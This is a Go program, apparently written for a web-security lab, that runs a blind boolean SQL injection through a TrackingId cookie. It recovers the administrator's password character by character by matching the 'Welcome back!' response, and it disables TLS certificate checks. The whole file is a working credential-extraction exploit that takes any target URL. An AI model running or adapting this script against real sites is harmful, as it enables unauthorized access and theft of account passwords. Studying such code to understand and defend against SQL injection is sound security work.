package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {

	startTime := time.Now() // Captura o tempo de início

	if len(os.Args)-1 != 3 {
		fmt.Println("Usage:", os.Args[0], "<url> <sessionCookie> <trackingId>")
		fmt.Println("(+) Example:", os.Args[0], "www.example.com nqSneFd1xzfzKsc6YpWXiSsqSpZDrT20 yvpLsSz5wtE68Cze")
	}

	url := os.Args[1]
	session := os.Args[2]
	tranckingId := os.Args[3]

	exploit(url, session, tranckingId)

	endTime := time.Now()                 // Captura o tempo de fim
	elapsedTime := endTime.Sub(startTime) // Calcula o tempo decorrido
	fmt.Printf("\nTempo de execução: %s\n", elapsedTime)

}

func exploit(targetUrl string, session string, trackingId string) {
	// Create a new client
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// Create a new request
	req, err := http.NewRequest(http.MethodGet, targetUrl, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	alphanumerics := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

	index_password := 1
	password := ""

	for {
		for _, alphanumeric := range alphanumerics {

			// Set the session cookie
			sessionCookie := fmt.Sprintf("session=%s;", session)
			trackingIdCookie := fmt.Sprintf("TrackingId=%s' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), %d, 1) = '%c;", trackingId, index_password, alphanumeric)
			//fmt.Println(trackingIdCookie)
			cookie := sessionCookie + trackingIdCookie
			req.Header.Set("Cookie", cookie)

			// Send the request
			res, err := client.Do(req)
			if err != nil {
				fmt.Println("Error sending request:", err)
				return
			}

			// Read the response body
			body, err := io.ReadAll(res.Body)
			if err != nil {
				fmt.Println("Error reading response body:", err)
			}
			bodyString := string(body)

			// Check if the response body contains the string "Welcome back!"
			if strings.Contains(bodyString, "Welcome back!") {
				password += string(alphanumeric)
				index_password++
				break
			}

			// If all values were tested an none got answer, is because the length of the password was alerady reached
			if string(alphanumeric) == "9" {
				fmt.Println(password)
				return
			}

			res.Body.Close()
		}
	}

}
